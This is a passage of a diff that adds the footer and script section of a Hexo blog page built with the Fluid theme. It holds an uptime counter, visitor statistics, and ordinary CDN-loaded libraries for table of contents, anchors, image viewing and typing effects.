+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="https://static.kevinchu.top/blog/assets/js/stars.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
